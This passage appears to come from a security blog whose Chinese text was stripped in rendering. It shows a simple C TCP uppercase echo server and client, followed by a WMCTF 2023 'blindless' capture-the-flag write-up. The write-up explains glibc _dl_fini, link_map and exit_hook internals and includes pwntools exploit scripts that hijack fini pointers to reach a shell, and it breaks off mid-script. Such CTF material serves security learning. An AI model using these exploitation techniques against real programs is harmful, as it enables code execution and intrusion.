class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">string</span>[i] = <span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct sockaddr_in &#123;</span></span><br><span class="line"><span class="comment"> short int sin_family; Address family</span></span><br><span class="line"><span class="comment">    unsigned short int sin_port; Port number</span></span><br><span class="line"><span class="comment">    struct in_addr sin_addr;  Internet address</span></span><br><span class="line"><span class="comment">    unsigned char sin_zero[8]; Same size as struct sockaddr</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;  <span class="comment">//</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ,linux</span></span><br><span class="line"><span class="comment">    hton:host to network</span></span><br><span class="line"><span class="comment">    uint16_t htons(uint16_t hostlong) 16</span></span><br><span class="line"><span class="comment">    uint32_t htonl(uint32_t hostlong) 32</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// IP</span></span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);               <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//socket</span></span><br><span class="line">    <span class="comment">// int bind(int  sockfd, const struct sockaddr * addr, socklen_t  len)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TCP</span></span><br><span class="line">    <span class="keyword">if</span> (listen(serverSocket, MAXQUEUE) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">        <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">        <span class="comment">// Int accept(int sockfd,  struct sockaddr *restrict  addr, socklen_t</span></span><br><span class="line">        <span class="comment">// *restrict  len)</span></span><br><span class="line">        <span class="comment">//tcp,socket</span></span><br><span class="line">        <span class="type">int</span> connectionSocket =</span><br><span class="line">            accept(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">        <span class="keyword">if</span> (connectionSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">               ntohs(clientSockaddr.sin_port));</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// int recv(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        recv(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buffer);</span><br><span class="line">        stringLow2Upper(buffer);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Int send(int sockfd,  const void *buf,  size_t  nbytes,  int  flags);</span></span><br><span class="line">        send(connectionSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">        close(connectionSocket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// int connect(int  sockfd, const struct sockaddr  *addr,  socklen_t  len);</span></span><br><span class="line">    <span class="comment">//tcp</span></span><br><span class="line">    <span class="keyword">if</span> (connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                <span class="keyword">sizeof</span>(serverSockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;string--&gt;STRING&quot;</span>);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    send(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    recv(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(recvBuffer);</span><br><span class="line">    close(clientSocket);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 WMCTF</title>
      <link href="/2023/08/28/2023wmctf/"/>
      <url>/2023/08/28/2023wmctf/</url>
      
        <content type="html"><![CDATA[<h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/w/blindless&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/wmctf/blindless/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>executeBrainfuckcodemallocdatadatammaplibc</p><h2 id="dl-fini"><a href="#dl-fini" class="headerlink" title="_dl_fini"></a>_dl_fini</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//: main</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//: init ELF</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//: fini ELF</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//: rtld_fini ld</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//: </span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831174521411.png" alt="image-20230831174521411"></p><p>.init_arrayinit(__libc_csu_init).init_array</p><p>.fini_arrayfini(__libc_csu_fini)</p><p><img src="/2023/08/28/2023wmctf/image-20230831174746076.png" alt="image-20230831174746076"></p><p>ld rtdl_finirdl_fini_dl_fini()ld.so.2</p><p>ld.so.2dl_open(), **_rtld_global**, ld.so.2, fini_arrary</p><blockquote><p>Linux Namespacesnamespace, </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span>//</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//_ns_loaded, , _ns_loaded</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">        <span class="comment">/* _ns_loaded */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br></pre></td></tr></table></figure><p>link_map *_ns_loaded </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;<span class="comment">/*  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/*   */</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;<span class="comment">/* ELFDynamic */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span><span class="comment">/*  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span><span class="comment">/*  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns; <span class="comment">/* NameSapceidx  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info </span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF  */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* ELF  */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/*   */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic  *</span></span><br><span class="line"><span class="comment">    .......</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *648bit /</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span><span class="number">8b</span>it </span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230831195723378.png" alt="image-20230831195723378"></p><p>_dl_finirtld_globalfini_array, </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span><span class="comment">//</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">              ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)<span class="comment">//fini_array</span></span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">      <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)<span class="comment">//fini</span></span><br><span class="line">    DL_CALL_DT_FINI</span><br><span class="line">      (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>.fini_array<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>,l-&gt;l_info[DT_FINI_ARRAYSZ]0.fini_arry</p><p>l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</p><p>l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</p><p><img src="/2023/08/28/2023wmctf/image-20230901011053856.png" alt="image-20230901011053856"></p><p>l-&gt;l_addrl-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr+l-&gt;l_addrbackdoorl-&gt;l_info[DT_FINI_ARRAY]0</p><blockquote><p>rdi(libc2.31 _rtld_global+2312)rdi&#x2F;bin&#x2F;shfinisystem.fini_arrysystem got</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x130E&#x27;)</span></span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x001301&#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fe5e466f190</span>- <span class="number">0x7fe5e4357010</span>)+write(p32(<span class="number">0x3CB1</span>)[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7f30010c62a0</span>-<span class="number">0x7f30010c6190</span>-<span class="number">2</span>)+write(p64(<span class="number">0</span>))+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">    data=io.recvrepeat(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">      <span class="built_in">print</span>(data)</span><br><span class="line">      pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      io.close()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230901010937493.png" alt="image-20230901010937493"></p><h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a><a href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">exit_hook</a></h2><p>rtld_global() exit()&gt;__run_exit_handlers&gt;_dl_fini&gt;rtld_lock_default_lock_recursive&gt;rtld_lock_default_unlock_recursive</p><p><code>rtld_lock_default_lock_recursive</code><code>rtld_lock_default_unlock_recursive</code><code>_rtld_global</code></p><p><img src="/2023/08/28/2023wmctf/image-20230830134733689.png" alt="image-20230830134733689"></p><p>rtld_lock_default_lock_recursive<code>rtld_lock_default_unlock_recursive</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock))</span><br></pre></td></tr></table></figure><p><code>GL(dl_load_lock)</code><code>_rtld_global</code><code>_rtld_global._dl_load_lock.mutex</code></p><blockquote><p>libcld</p></blockquote><p><code>rtld_lock_default_lock_recursive</code><code>rtld_lock_default_unlock_recursive</code>ogg</p><p><code>rtld_lock_default_lock_recursive</code><code>rtld_lock_default_unlock_recursive</code>system<code>_rtld_global._dl_load_lock.mutex</code>&#x2F;bin&#x2F;sh\x00</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1301  &#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x01313&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(pwnfile)</span><br><span class="line">        sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">        code=<span 